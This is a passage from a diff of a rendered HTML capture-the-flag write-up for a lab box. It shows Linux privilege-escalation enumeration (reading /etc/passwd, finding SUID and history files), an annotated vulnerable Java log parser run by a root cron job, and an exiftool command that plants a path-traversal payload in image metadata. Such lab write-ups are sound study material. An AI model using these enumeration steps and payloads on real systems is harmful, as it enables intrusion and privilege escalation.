 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-01-03-181429_.png">
 </figure>
@@ -898,7 +898,7 @@
 <h4 id="apache-maven">Apache-Maven:</h4>
 <ul>
 <li>I find an installation of apache maven in woodenk&rsquo;s home folder. Looking at his <code>.bashrc</code> file I see the below entries.
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export MAVEN_HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/opt/maven&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export MAVEN_HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/opt/maven&#34;</span>
 </span></span><span style="display:flex;"><span>export MAVEN_VERSION<span style="color:#f92672">=</span>3.8.3
 </span></span><span style="display:flex;"><span>export MAVEN_CONFIG_HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home/woodenk/.m2&#34;</span>
 </span></span><span style="display:flex;"><span>export JAVA_HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/lib/jvm/java-11-openjdk-amd64/bin/java&#34;</span>
@@ -958,105 +958,105 @@
 </li>
 <li>
 <p><strong>Check Kernel Version</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>uname -a
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>uname -a
 </span></span></code></pre></div></li>
 <li>
 <p><strong>Enumerate PATH</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo $PATH
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo $PATH
 </span></span></code></pre></div></li>
 <li>
 <p><strong>Enumerate enviromental variables</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>env
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>env
 </span></span></code></pre></div><ul>
 <li>Anything interesting in here PATH.</li>
 </ul>
 </li>
 <li>
 <p><strong>Enumerate available shells</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/shells
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/shells
 </span></span></code></pre></div><ul>
 <li>Are additional shells such as tmux/zshrc/fish etc available, if so are there configs for them? Read them.</li>
 </ul>
 </li>
 <li>
 <p><strong>Enumerate Sudo Version</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -V
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -V
 </span></span></code></pre></div></li>
 <li>
 <p><strong>Check Users Last Login Times</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lastlog
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lastlog
 </span></span></code></pre></div><ul>
 <li>This can give us an idea of how widely used this system is &amp; when it is used.</li>
 </ul>
 </li>
 <li>
 <p><strong>View who is currently logged in</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>w
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>w
 </span></span></code></pre></div></li>
 <li>
 <p><strong>View user home folder</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ls -la /home
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ls -la /home
 </span></span></code></pre></div></li>
 <li>
 <p><strong>View users bash history</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat ~/.bashrc~
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat ~/.bashrc~
 </span></span></code></pre></div><ul>
 <li>Reviewing what the user has been doing can gives insight into the type of server and hints to privilege escalation paths.</li>
 </ul>
 </li>
 <li>
 <p><strong>Search for all history files</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -type f <span style="color:#ae81ff">\(</span> -name *_hist -o -name *_history <span style="color:#ae81ff">\)</span> -exec ls -l <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -type f <span style="color:#ae81ff">\(</span> -name *_hist -o -name *_history <span style="color:#ae81ff">\)</span> -exec ls -l <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null
 </span></span></code></pre></div></li>
 <li>
 <p><strong>View User Information</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Always run a full cat /etc/passwd as embedded systems may have hard coded hashes in the file.</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Always run a full cat /etc/passwd as embedded systems may have hard coded hashes in the file.</span>
 </span></span><span style="display:flex;"><span>cat /etc/passwd
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Lists all users /in etc/passwd</span>
 </span></span><span style="display:flex;"><span>cat /etc/passwd | cut -f1 -d:
 </span></span></code></pre></div></li>
 <li>
 <p><strong>View User Information</strong>: Shows Group too.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>id -nG
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>id -nG
 </span></span></code></pre></div><ul>
 <li>This will show groups our user is a part of, ensure to check if they are part of any of these default groups:</li>
 </ul>
 </li>
 <li>
 <p><strong>View sudo privileges</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -l
 </span></span></code></pre></div></li>
 <li>
 <p><strong>View Group Information</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/group
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/group
 </span></span></code></pre></div></li>
 <li>
 <p><strong>Check which users have login shells</strong>: +do this!!!+</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/passwd | grep <span style="color:#e6db74">&#34;*sh</span>$<span style="color:#e6db74">&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/passwd | grep <span style="color:#e6db74">&#34;*sh</span>$<span style="color:#e6db74">&#34;</span>
 </span></span></code></pre></div></li>
 <li>
 <p><strong>List tmux sessions</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tmux ls
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tmux ls
 </span></span></code></pre></div></li>
 <li>
 <p><strong>One liner to find all SUID (4000), SGID (1000) or both (6000)</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Filters out snamp folders</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Filters out snamp folders</span>
 </span></span><span style="display:flex;"><span>find / <span style="color:#ae81ff">\(</span> -type d -name <span style="color:#e6db74">&#39;*snap*&#39;</span> -prune <span style="color:#ae81ff">\)</span> -o <span style="color:#ae81ff">\(</span> -type f <span style="color:#ae81ff">\(</span> -perm -4000 -o -perm -2000 -o -perm -6000 <span style="color:#ae81ff">\)</span> -exec ls -ldb <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> <span style="color:#ae81ff">\)</span> 2&gt;/dev/null | grep -v <span style="color:#e6db74">&#34;snap&#34;</span>
 </span></span></code></pre></div></li>
 <li>
 <p><strong>Find Writable Files</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null
 </span></span></code></pre></div></li>
 <li>
 <p><strong>Find all logfiles</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -type f -name <span style="color:#e6db74">&#34;*.log&#34;</span> 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -type f -name <span style="color:#e6db74">&#34;*.log&#34;</span> 2&gt;/dev/null
 </span></span></code></pre></div><ul>
 <li>This did reveal: <code>/opt/panda_search/redpanda.log</code> but that was seen earlier.</li>
 </ul>
 </li>
 <li>
 <p><strong>Connections and Services</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netstat -antup
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netstat -antup
 </span></span></code></pre></div></li>
 </ul>
 <h3 id="checking-running-processes-with-pspy-and-finding-a-cron-job-running-as-root">Checking Running Processes With <a href="https://github.com/DominicBreuker/pspy"  target="_blank" rel="noreferrer nofollow">pspy</a>
@@ -1099,7 +1099,7 @@
 <ul>
 <li>
 <p><strong>Package declarations and imports for file, image, and XML processing</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.logparser;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.logparser;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.*;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.drew.imaging.*;
@@ -1112,7 +1112,7 @@
 </li>
 <li>
 <p><strong>&ldquo;parselog&rdquo; Function - Parses log lines containing status code, IP, user agent, and URI separated by</strong> <code>||</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">parseLog</span>(String line) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">parseLog</span>(String line) {
 </span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> strings <span style="color:#f92672">=</span> line.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\\|\\|&#34;</span>);
 </span></span><span style="display:flex;"><span>    Map map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
 </span></span><span style="display:flex;"><span>    map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;status_code&#34;</span>, Integer.<span style="color:#a6e22e">parseInt</span>(strings<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>));
@@ -1140,7 +1140,7 @@
 </li>
 <li>
 <p><strong>Method &ldquo;isImage&rdquo; checks if a filename contains <code>.jpg</code> extension</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isImage</span>(String filename) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isImage</span>(String filename) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(filename.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;.jpg&#34;</span>)) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
 </span></span><span style="display:flex;"><span>    }
@@ -1153,7 +1153,7 @@
 </li>
 <li>
 <p><strong>Extracts Artist tag from JPEG metadata using the image&rsquo;s URI</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getArtist</span>(String uri) <span style="color:#66d9ef">throws</span> IOException, JpegProcessingException {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getArtist</span>(String uri) <span style="color:#66d9ef">throws</span> IOException, JpegProcessingException {
 </span></span><span style="display:flex;"><span>    String fullpath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/panda_search/src/main/resources/static&#34;</span> <span style="color:#f92672">+</span> uri;
 </span></span><span style="display:flex;"><span>    File jpgFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(fullpath);
 </span></span><span style="display:flex;"><span>    Metadata metadata <span style="color:#f92672">=</span> JpegMetadataReader.<span style="color:#a6e22e">readMetadata</span>(jpgFile);
@@ -1186,7 +1186,7 @@
 </li>
 <li>
 <p><strong>Updates view counts in XML file for specific image and total views</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addViewTo</span>(String path, String uri) <span style="color:#66d9ef">throws</span> JDOMException, IOException {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addViewTo</span>(String path, String uri) <span style="color:#66d9ef">throws</span> JDOMException, IOException {
 </span></span><span style="display:flex;"><span>    SAXBuilder saxBuilder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXBuilder();
 </span></span><span style="display:flex;"><span>    XMLOutputter xmlOutput <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XMLOutputter();
 </span></span><span style="display:flex;"><span>    xmlOutput.<span style="color:#a6e22e">setFormat</span>(Format.<span style="color:#a6e22e">getPrettyFormat</span>());
@@ -1223,7 +1223,7 @@
 </li>
 <li>
 <p><strong>Main method processes log file to update view counts for JPG images based on artist</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> JDOMException, IOException, JpegProcessingException {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> JDOMException, IOException, JpegProcessingException {
 </span></span><span style="display:flex;"><span>    File log_fd <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(<span style="color:#e6db74">&#34;/opt/panda_search/redpanda.log&#34;</span>);
 </span></span><span style="display:flex;"><span>    Scanner log_reader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Scanner(log_fd);
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Reads the log file line by line &amp; stores in variable &#34;line&#34;</span>
@@ -1285,7 +1285,7 @@
 <h3 id="why-the-code-is-vulnerable">Why The Code Is Vulnerable:</h3>
 <p>The code contains multiple critical vulnerabilities that chain together. Let&rsquo;s me explain the key vulnerable components:</p>
 <h4 id="vulnerable-log-parsing">Vulnerable Log Parsing:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">parseLog</span>(String line) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">parseLog</span>(String line) {
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: No input validation</span>
 </span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> strings <span style="color:#f92672">=</span> line.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\\|\\|&#34;</span>);
 </span></span><span style="display:flex;"><span>    Map map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
@@ -1302,7 +1302,7 @@
 <li>Can be manipulated to inject malicious URIs</li>
 </ul>
 <h4 id="weak-image-validation">Weak Image Validation:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isImage</span>(String filename) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isImage</span>(String filename) {
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: Basic string check only</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(filename.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;.jpg&#34;</span>)) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
@@ -1319,7 +1319,7 @@
 </li>
 </ul>
 <h4 id="unsafe-artist-metadata-extraction">Unsafe Artist Metadata Extraction:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getArtist</span>(String uri) <span style="color:#66d9ef">throws</span> IOException, JpegProcessingException {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getArtist</span>(String uri) <span style="color:#66d9ef">throws</span> IOException, JpegProcessingException {
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: Direct path concatenation</span>
 </span></span><span style="display:flex;"><span>    String fullpath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/panda_search/src/main/resources/static&#34;</span> <span style="color:#f92672">+</span> uri;
 </span></span><span style="display:flex;"><span>    File jpgFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(fullpath);
@@ -1340,7 +1340,7 @@
 <li>Artist tag used in file paths without sanitization</li>
 </ul>
 <h4 id="vulnerable-xml-processing">Vulnerable XML Processing:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addViewTo</span>(String path, String uri) <span style="color:#66d9ef">throws</span> JDOMException, IOException {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addViewTo</span>(String path, String uri) <span style="color:#66d9ef">throws</span> JDOMException, IOException {
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: XXE possible - external entities enabled</span>
 </span></span><span style="display:flex;"><span>    SAXBuilder saxBuilder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXBuilder();
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: Path traversal via artist name</span>
@@ -1444,7 +1444,7 @@
 </li>
 <li>
 <p>Verify current metadata state:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>exiftool Cat.jpg
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>exiftool Cat.jpg
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-01-11-103141_.png">
     </figure>
 
@@ -1455,7 +1455,7 @@
 </li>
 <li>
 <p>Inject path traversal payload into Artist metadata:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>exiftool -Artist<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;../tmp/bloodstiller&#39;</span> Cat.jpg
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>exiftool -Artist<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;../tmp/bloodstiller&#39;</span> Cat.jpg
 </span></span></code></pre></div><ul>
 <li>This creates path: <code>/credits/../tmp/bloodstiller_creds.xml</code></li>
 <li>Uses directory traversal to escape <code>/credits/</code> directory</li>
@@ -1466,7 +1466,7 @@
 <ol>
 <li>
 <p>Download the template from web application that we discovered earlier.</p>
